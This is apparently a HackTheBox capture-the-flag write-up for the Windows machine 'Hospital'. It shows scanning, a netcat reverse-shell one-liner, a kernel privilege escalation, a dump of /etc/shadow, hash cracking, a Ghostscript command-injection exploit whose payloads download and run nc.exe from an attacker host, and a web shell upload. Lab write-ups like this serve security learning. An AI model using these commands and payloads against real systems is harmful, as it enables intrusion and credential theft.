---
layout: post
title: HTB{Hospital}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, windows]
---
<!--cut-->

* TOC
{:toc}


### USER:

Scan [IP]:

`nmap -sC -sV -A -p- -Pn [IP]`

```text
┌──(kali㉿kali)-[~/htb/machines/Hospital]
└─$ nmap -sC -sV -A -p- -Pn 10.10.11.241
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-28 20:16 CET
Stats: 0:08:26 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 91.25% done; ETC: 20:25 (0:00:49 remaining)
Nmap scan report for 10.10.11.241
Host is up (0.041s latency).
Not shown: 65506 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-29 02:24:47Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2023-09-05T18:39:34
|_Not valid after:  2024-03-06T18:39:34
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-29T02:25:43+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6613/tcp open  msrpc             Microsoft Windows RPC
6632/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
8771/tcp open  msrpc             Microsoft Windows RPC
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-29T02:25:46
|_  start_date: N/A
|_clock-skew: mean: 6h59m26s, deviation: 0s, median: 6h59m25s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 647.68 seconds
```

Seems like File Upload Attack, Hmm. I try to upload a PHP Reverse Shell but no chance. So I try to make an Image File.

```text
touch exploit.jpg; echo test > exploit.jpg
```
Replace the content with this PHP Shell.

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.42 9001 >/tmp/f
```

I try to escalate my Privilege to Root in Linux. I saw the Kernel version is Vulnerable. It is 5.19.0. So In try this Exploit [GameOver(lay)].

```text
www-data@webserver:/tmp$ ./exploit.sh
./exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
whoami
root
/bin/bash -i
bash: cannot set terminal process group (914): Inappropriate ioctl for device
bash: no job control in this shell
root@webserver:/tmp# cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
sync:*:19462:0:99999:7:::
games:*:19462:0:99999:7:::
man:*:19462:0:99999:7:::
lp:*:19462:0:99999:7:::
mail:*:19462:0:99999:7:::
news:*:19462:0:99999:7:::
uucp:*:19462:0:99999:7:::
proxy:*:19462:0:99999:7:::
www-data:*:19462:0:99999:7:::
backup:*:19462:0:99999:7:::
list:*:19462:0:99999:7:::
irc:*:19462:0:99999:7:::
_apt:*:19462:0:99999:7:::
nobody:*:19462:0:99999:7:::
systemd-network:!*:19462::::::
systemd-timesync:!*:19462::::::
messagebus:!:19462::::::
systemd-resolve:!*:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::

```

So I thought I can Access the Web-Mail Portal. So I try to check the Present User password Hashes in this Machine. The user is Drwilliams.


```text
www-data@webserver:/tmp$ cat /var/www/html/config.php
cat /var/www/html/config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```
```text
┌──(kali㉿kali)-[~/htb/machines/Hospital]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwe123!@#        (drwilliams)     
1g 0:00:01:14 DONE (2023-11-28 21:35) 0.01343g/s 2879p/s 2879c/s 2879C/s renchelle..pucci
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Login to webmail `drwilliams` with password: `qwe123!@#`.

https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection?source=post_page-----887fd3d6fee9--------------------------------

```text
┌──(kali㉿kali)-[~/htb/machines/Hospital/CVE-2023-36664-Ghostscript-command-injection]
└─$ python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.15.42/nc.exe -o nc.exe" --filename file.eps
[+] Payload successfully injected into file.eps.
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Hospital/CVE-2023-36664-Ghostscript-command-injection]
└─$ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.15.42 4444 -e cmd.exe" --filename file.eps
[+] Payload successfully injected into file.eps.
```

```text
C:\Users\drbrown.HOSPITAL\Desktop>type user.txt
type user.txt
c4384e509fdc06e8dee11cee19690b47
```
### ROOT:





```text
C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```


```text
*Evil-WinRM* PS C:\xampp\htdocs> upload shell.php
                                        
Info: Uploading /home/kali/htb/machines/Hospital/shell.php to C:\xampp\htdocs\shell.php
                                        
Data: 3444 bytes of 3444 bytes copied
```



```text
DC$@DC:C:\Users\Administrator\Desktop# type root.txt
fa96ecfaed68002ac75cf6f85d6f51fd
```



